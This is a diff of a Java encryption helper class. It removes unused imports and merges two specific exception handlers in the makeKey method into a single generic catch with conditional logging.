@@ -9,20 +9,12 @@
 
 package com.android.networking.crypto;
 
-import java.security.InvalidAlgorithmParameterException;
-import java.security.InvalidKeyException;
-import java.security.MessageDigest;
 import java.security.NoSuchAlgorithmException;
-import java.util.zip.CRC32;
 
-import javax.crypto.BadPaddingException;
-import javax.crypto.IllegalBlockSizeException;
 import javax.crypto.NoSuchPaddingException;
 
-import com.android.networking.Messages;
 import com.android.networking.auto.Cfg;
 import com.android.networking.util.Check;
-import com.android.networking.util.Utils;
 
 // TODO: Auto-generated Javadoc
 
@@ -170,15 +162,7 @@ public class Encryption {
 	public void makeKey(final byte[] key) {
 		try {
 			crypto = new Crypto(key);
-		} catch (final NoSuchAlgorithmException e) {
-			if (Cfg.EXCEPTION) {
-				Check.log(e);
-			}
-
-			if (Cfg.DEBUG) {
-				Check.log(e);//$NON-NLS-1$
-			}
-		} catch (final NoSuchPaddingException e) {
+		} catch (final Exception e) {
 			if (Cfg.EXCEPTION) {
 				Check.log(e);
 			}
